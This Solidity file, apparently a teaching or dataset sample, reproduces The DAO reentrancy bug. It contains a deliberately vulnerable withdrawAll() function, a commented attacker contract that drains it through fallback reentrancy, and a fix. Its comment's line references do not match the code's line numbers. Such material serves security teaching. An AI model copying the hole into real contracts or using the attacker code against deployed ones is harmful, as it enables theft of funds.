/*LN-1*/ // SPDX-License-Identifier: MIT
/*LN-2*/ pragma solidity ^0.4.19;
/*LN-3*/ 
/*LN-4*/ /**
/*LN-5*/  * @title The DAO - Classic Reentrancy Vulnerability
/*LN-6*/  * @notice This contract demonstrates the vulnerability that led to The DAO hack
/*LN-7*/  * @dev June 17, 2016 - The most famous smart contract hack in history
/*LN-8*/  *
/*LN-9*/  * VULNERABILITY: Classic reentrancy attack
/*LN-10*/  *
/*LN-11*/  * ROOT CAUSE:
/*LN-12*/  * The withdrawAll() function sends ETH to the caller BEFORE updating their balance.
/*LN-13*/  * This allows a malicious contract to re-enter the withdrawAll() function during
/*LN-14*/  * the external call, withdrawing funds multiple times before the balance is set to zero.
/*LN-15*/  *
/*LN-16*/  * ATTACK VECTOR:
/*LN-17*/  * 1. Attacker deposits ETH into the contract
/*LN-18*/  * 2. Attacker calls withdrawAll() from a malicious contract
/*LN-19*/  * 3. Contract sends ETH to attacker via call.value()
/*LN-20*/  * 4. Attacker's fallback function is triggered, which calls withdrawAll() again
/*LN-21*/  * 5. Since balance hasn't been updated yet, attacker withdraws again
/*LN-22*/  * 6. Steps 3-5 repeat until contract is drained or gas runs out
/*LN-23*/  *
/*LN-24*/  * The vulnerability allowed the attacker to drain 3.6M ETH (~$60M at the time).
/*LN-25*/  * This led to Ethereum's controversial hard fork into ETH and ETC.
/*LN-26*/  */
/*LN-27*/ contract VulnerableDAO {
/*LN-28*/     mapping(address => uint256) public credit;
/*LN-29*/     uint256 public balance;
/*LN-30*/ 
/*LN-31*/     /**
/*LN-32*/      * @notice Deposit ETH into the contract
/*LN-33*/      */
/*LN-34*/     function deposit() public payable {
/*LN-35*/         credit[msg.sender] += msg.value;
/*LN-36*/         balance += msg.value;
/*LN-37*/     }
/*LN-38*/ 
/*LN-39*/     /**
/*LN-40*/      * @notice Withdraw all credited ETH
/*LN-41*/      *
/*LN-42*/      * VULNERABILITY IS HERE:
/*LN-43*/      * The function follows the pattern:
/*LN-44*/      * 1. Check balance (line 49)
/*LN-45*/      * 2. Send ETH (line 51) <- EXTERNAL CALL
/*LN-46*/      * 3. Update state (line 53) <- TOO LATE!
/*LN-47*/      *
/*LN-48*/      * This is a textbook "checks-effects-interactions" violation.
/*LN-49*/      * State should be updated BEFORE external calls.
/*LN-50*/      */
/*LN-51*/     function withdrawAll() public {
/*LN-52*/         uint256 oCredit = credit[msg.sender];
/*LN-53*/         if (oCredit > 0) {
/*LN-54*/             balance -= oCredit;
/*LN-55*/             // VULNERABLE LINE: External call before state update
/*LN-56*/             bool callResult = msg.sender.call.value(oCredit)();
/*LN-57*/             require(callResult);
/*LN-58*/             credit[msg.sender] = 0; // This happens too late!
/*LN-59*/         }
/*LN-60*/     }
/*LN-61*/ 
/*LN-62*/     /**
/*LN-63*/      * @notice Get credited amount for an address
/*LN-64*/      */
/*LN-65*/     function getCredit(address user) public view returns (uint256) {
/*LN-66*/         return credit[user];
/*LN-67*/     }
/*LN-68*/ }
/*LN-69*/ 
/*LN-70*/ /**
/*LN-71*/  * Example attack contract:
/*LN-72*/  *
/*LN-73*/  * contract DAOAttacker {
/*LN-74*/  *     VulnerableDAO public dao;
/*LN-75*/  *     uint256 public iterations = 0;
/*LN-76*/  *
/*LN-77*/  *     constructor(address _dao) {
/*LN-78*/  *         dao = VulnerableDAO(_dao);
/*LN-79*/  *     }
/*LN-80*/  *
/*LN-81*/  *     function attack() public payable {
/*LN-82*/  *         dao.deposit.value(msg.value)();
/*LN-83*/  *         dao.withdrawAll();
/*LN-84*/  *     }
/*LN-85*/  *
/*LN-86*/  *     function() public payable {
/*LN-87*/  *         iterations++;
/*LN-88*/  *         if (iterations < 10 && address(dao).balance > 0) {
/*LN-89*/  *             dao.withdrawAll();  // Reenter!
/*LN-90*/  *         }
/*LN-91*/  *     }
/*LN-92*/  * }
/*LN-93*/  *
/*LN-94*/  * REAL-WORLD IMPACT:
/*LN-95*/  * - 3.6M ETH stolen (~$60M in 2016, worth billions today)
/*LN-96*/  * - Led to Ethereum hard fork (ETH/ETC split)
/*LN-97*/  * - Changed smart contract development practices forever
/*LN-98*/  * - Introduced the "checks-effects-interactions" pattern as standard
/*LN-99*/  *
/*LN-100*/  * FIX:
/*LN-101*/  * Move the state update BEFORE the external call:
/*LN-102*/  *
/*LN-103*/  * function withdrawAll() public {
/*LN-104*/  *     uint256 oCredit = credit[msg.sender];
/*LN-105*/  *     if (oCredit > 0) {
/*LN-106*/  *         balance -= oCredit;
/*LN-107*/  *         credit[msg.sender] = 0;  // Update state FIRST
/*LN-108*/  *         bool callResult = msg.sender.call.value(oCredit)();  // Then call
/*LN-109*/  *         require(callResult);
/*LN-110*/  *     }
/*LN-111*/  * }
/*LN-112*/  *
/*LN-113*/  * Or use ReentrancyGuard modifier from OpenZeppelin.
/*LN-114*/  *
/*LN-115*/  *
/*LN-116*/  * KEY LESSON:
/*LN-117*/  * Always update internal state BEFORE making external calls.
/*LN-118*/  * This is the foundation of secure smart contract development.
/*LN-119*/  */
/*LN-120*/ 